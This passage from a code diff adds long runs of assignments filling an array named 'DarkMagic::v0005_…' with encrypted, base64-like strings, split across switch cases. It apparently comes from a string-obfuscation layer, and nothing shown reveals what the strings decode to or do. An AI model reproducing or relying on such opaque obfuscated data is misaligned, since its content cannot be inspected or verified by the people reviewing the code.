+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[57] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[58] = "EppOBQtxBWo=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[59] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[60] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[61] = "P7pds31eJyA1MCAg6ibp3Uqd8TOwxvN9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[62] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[63] = "P7pds31eJyAm9sl1JkN032K+Z5w0e3Pe";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[64] = "0Ez0xGp13BQ6RMtXF5tAvqKzYLqqGvPf";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[65] = "crxOp4cDMrHI4+3k0/0qZkBi5AMcHS+A";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[66] = "6GQbuu7W/txn0BhOTRVLz4wTlJu6z/kpPx+YyGnugRc5Swqs0QPixKB6cK7gZDQ6kPpKU2Bw48KBMiXhouisj9XktoXo9jiS+ZpRdeYzVdhFTQaEYDPs45dEROu5mM8S6St6rRBWnoX6OuLf/jODqElYh0kIB6wK88HxtpR/tgz4BUrbreNJynwhmovdpidDy+u+OXldus8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[67] = "9elNDU8Ob2j9LtvogfaD64LXlbzQg6RDsP0nsa6GzzPwem3csuvQY8IewmG9gkPlcVxio4fbmwZ9PKBdMNP4ayIK4Ejqt4f8CAX8BgALobU=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[68] = "/M5gOtbLZmABKE1Uv5lVjOIBqJ/lGYWAtLlYCisWbRH5JnDdnJpCPGsCkXf0NU3L";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[69] = "xdTnvrgCmRNP3+c1K1+RL5pfjM9fmj/o";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[70] = "R484lsVNkYjRLCNoZf25ADjd+fU/x2jJ";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[71] = "3M2WZB9yP+QftlVqdUP4xvcULyY0g33TiIsIrWP+eS8drJAughDEFiftx29AxKkV2xnRetIEitxS8IHIpPvUj3zKm6K+shXQ1T5LTuEyi/lyO9SsymU9xTf+dEautphtucVTXOsHmmhhJQdBeEARDtm9bHi+mbYzsFw6F2CoiIMkJVW7hYbm+dz2MSHaNxNMGQ6Jty9o4EM=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[72] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[73] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[74] = "P7pds31eJyDeGKRyvxD8ao4wDNKMIbFo";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[75] = "Y8W6KBDKe8tYXsAIJd6pWQ==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[76] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[77] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[78] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[79] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[80] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[81] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[82] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[83] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[84] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[85] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[86] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[87] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[88] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[89] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[90] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[91] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[92] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[93] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[94] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[95] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[96] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[97] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[98] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[99] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[100] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[101] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[102] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[103] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[104] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[105] = "ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[106] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[107] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[108] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[109] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[110] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[111] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[112] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[113] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[114] = "XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[115] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[116] = "M+wP1oJmbeTzpSkpuP8BPXgxvgKaeP0fk1mv99cvAl4NudtC171dl3vvm9y+6zk+EsURfTvrDEIECGx2AuEMGp9Mow4063Ip4up1G7aTSZd6uE/c66WvOfZs3E4pgT0y+v7qi6K2qd9j2Ntzn3ryETRTM2bNeQoDZ/SRBdgoEonsqfO8p3rKWL4rg0G0yoFoZRYAlrvN1zySDxmjMS0ej0usqgzDEd+WY7BQgQVpH+DMMPT8zqlu1w==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[117] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9";
+                    looporswitchbreak()
+                
+                case 1:
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[0] = "0Ez0xGp13BQ6RMtXF5tAvsVnujnXGZ6p";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[1] = "op+YbNuekTK0S45W1onhqtDnLIXumrbyYVCTQtmLZSwjUiXYJobLKgpLlMOPgVKL";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[2] = "smNQZrUyrGImLGZMFrpCgSXkYfrLrRggmIlBi8KORnBtmL3FYw7kzQQ4nco9poNhFkAA6iXHnnKpsK2wpb3VpCw+HM8mJa24O6hl2m3YXYrz7Bk4DEgvjcrf60MR7M233P+ZFRTbw4E=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[3] = "90G07n34WWT19KwEsDRxaJlDtRzf1iTTnW4F53w2GwbLmQG9yhSVXZFkwRueWWaCcWQL/+4eIECxk1HQP5FytyRTSxB0vGutVxuxzGebOT28GQc66WLZFfJyrEJSILLB6KGrDNhdkjagDBd4mR88VfqMeFZ2C/8+TxyJ2t97zZxSH4UK48DlzSNusi4CXv0Q7ErJUIBdi4myE8iHr3mKDg==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[4] = "zs8Nflkw9eQ=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[5] = "anlKcumGi1H3PlOxaSsEebO1KST+WvhcY4lqs7Vk2bM=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[6] = "X71CqQ6zYzHOnWyYRWpRwerkMmBg3x+ToYK1QrKfK0k=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[7] = "VlHl8rMmKaVsF6dqyOFsabYbpOKwZ3e0DjbA3FUCdPI=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[8] = "ECjyvVhK3+9bdjKa9dSN/yP1s7Q0WqgabhDANzSGAEg=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[9] = "Oo3EyAPLBuulz0GFi+2eBQ==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[10] = "iD9Jue670l+FcX0IS3xB2w==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[11] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sE2uOGmnQuZ+8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[12] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5N16kTALcTSaB78yfE0gLSo";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[13] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEOqLMx3+b+PM=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[14] = "JA+fI7CGo/m31O+sFjnI0aZ4lv8tTs9p";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[15] = "XfAmJrjLaqGs7/GOMWfHrOTzmJreRzW6NIhKlszOqtM=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[16] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXxl9bZ5wqxQQ=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[17] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5PVLXDvkYqkMpCWu6Y5TP4U";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[18] = "XfAmJrjLaqGs7/GOMWfHrLprAZxfY1Fy";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[19] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKYLiUuPTi8sgFWO/yAcjBkQ==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[20] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEJ2F8GLkhIxM=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[21] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeX3rmg7UmN0DU=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[22] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXnfr5hB0Dw6k=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[23] = "ECjyvVhK3+9bdjKa9dSN/w0XcNdq47FbdSEOGklA3cs=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[24] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKYDCjVYUDUWMTJVZwFSa+Cw==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[25] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5O222F2Uw8yS6nDlGzODHC+";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[26] = "XfAmJrjLaqGs7/GOMWfHrOGf7/8GBslv";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[27] = "I1CW8WOS5/+xoqhgAPKFDUjb8rK/go+r";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[28] = "ECjyvVhK3+9bdjKa9dSN/4gZJbIin83N";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[29] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXtOsrzJECjLM=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[30] = "IJcG6Od4P8nDUJ/gvgzTWA==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[31] = "ECjyvVhK3+9bdjKa9dSN/zR+ZympMNu6K628H7YqsBA=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[32] = "IJcG6Od4P8npkNkoNrMrUg==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[33] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuK5PakHs53Qr";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[34] = "XfAmJrjLaqGs7/GOMWfHrP99tbsrenrXoNBl2405Ba8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[35] = "XfAmJrjLaqGs7/GOMWfHrCfAQrDDtVFNMlSoudl+G9k=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[36] = "E4k0TOh0fe+hhkHgSX2mVA==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[37] = "XfAmJrjLaqGs7/GOMWfHrPSiCnK3+55V";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[38] = "XfAmJrjLaqGs7/GOMWfHrDc5SRTc4bov5BD2nKFSEx8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[39] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sE+Y9tjBy1TRg=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[40] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXNdRp+0qfVbs=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[41] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKaFWoRlBQdICRBBQhiUsvXw==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[42] = "XfAmJrjLaqGs7/GOMWfHrJZTNyOWTMjciHS3zWZi2Ww=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[43] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEubPmWqPzoAQ=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[44] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuFm4n/CbKdlx";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[45] = "XfAmJrjLaqGs7/GOMWfHrBUk9KmqNGUG0E+nh0ZRzy8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[46] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuM52xLXsM5MS";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[47] = "ECjyvVhK3+9bdjKa9dSN/1vMqhUhcSL+/9wObTMCo/U=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[48] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuCdWtR/Bo+ad";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[49] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKADzT1wXVl+z7LLDARiV1Yg==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[50] = "XfAmJrjLaqGs7/GOMWfHrBPMptQOjiac";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[51] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5Nax20uM3z3WUCmB5EBx6EF";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[52] = "P7pds31eJyAm9sl1JkN03wTCCar5pDgN";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[53] = "TfgetdCAef63x7XWx2/kqQ==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[54] = "ECjyvVhK3+9bdjKa9dSN/5mnJGri/i69";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[55] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUK/rOGBg2PaWB1mejfHXuFuQ==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[56] = "P7pds31eJyAm9sl1JkN039YR0WcDn2MH";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[57] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5PhP8iECimb+NwTIxz6RwHY";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[58] = "lIer0gGGWtg=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[59] = "XfAmJrjLaqGs7/GOMWfHrOKX0X9vnwyddHXE2t1/J2I=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[60] = "XfAmJrjLaqGs7/GOMWfHrNE7h/TKU+Ep";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[61] = "P7pds31eJyA1MCAg6ibp3RBXaoY24Rxv";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[62] = "ECjyvVhK3+9bdjKa9dSN//rHctiFDzTJTp2VpFpdmuQ=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[63] = "P7pds31eJyAm9sl1JkN030th0LG0WZc9";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[64] = "0Ez0xGp13BQ6RMtXF5tAvgl4FON1qhCS";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[65] = "crxOp4cDMrHI4+3k0/0qZsJ2MUyQN6gk";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[66] = "6GQbuu7W/txn0BhOTRVLz4wTlJu6z/kpPx+YyGnugRc5Swqs0QPixKB6cK7gZDQ6kPpKU2Bw48KBMiXhouisj9XktoXo9jiS+ZpRdeYzVdhFTQaEYDPs45dEROu5mM8S6St6rRBWnoX6OuLf/jODqElYh0kIB6wK88HxtpR/tgz4BUrbreNJynwhmovdpidDvl1sZVWHhMI0JIjL3sticg==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[67] = "9elNDU8Ob2j9LtvogfaD64LXlbzQg6RDsP0nsa6GzzPwem3csuvQY8IewmG9gkPlcVxio4fbmwZ9PKBdMNP4ayIK4Ejqt4f80lZYUJqumOo=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[68] = "/M5gOtbLZmABKE1Uv5lVjOIBqJ/lGYWAtLlYCisWbRH5JnDdnJpCPEq8ouJYJm57";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[69] = "xdTnvrgCmRNP3+c1K1+RL3JsuzVZ6Mwv";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[70] = "R484lsVNkYjRLCNoZf25AIGMEwvV+iHr";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[71] = "3M2WZB9yP+QftlVqdUP4xvcULyY0g33TiIsIrWP+eS8drJAughDEFiftx29AxKkV2xnRetIEitxS8IHIpPvUj3zKm6K+shXQ1T5LTuEyi/lyO9SsymU9xTf+dEautphtucVTXOsHmmhhJQdBeEARDtm9bHi+mbYzsFw6F2CoiIMkJVW7hYbm+dz2MSHaNxNMTuVcKKu+LEPX6DtkWtpSGg==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[72] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKo4fR8scLLDNmwzagxXytcA==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[73] = "XfAmJrjLaqGs7/GOMWfHrGGAGxmcJVx9hrXNIePQi8o=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[74] = "P7pds31eJyDeGKRyvxD8avpplBVM7vu5";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[75] = "Y8W6KBDKe8swIT4YPxBo6XsuNRUd/gSB";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[76] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sE2g4m76RgxpU=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[77] = "ECjyvVhK3+9bdjKa9dSN///FuA7PkzEw";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[78] = "ECjyvVhK3+9bdjKa9dSN/64W3njOTsF2";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[79] = "XfAmJrjLaqGs7/GOMWfHrJcFyEYzkSnD";
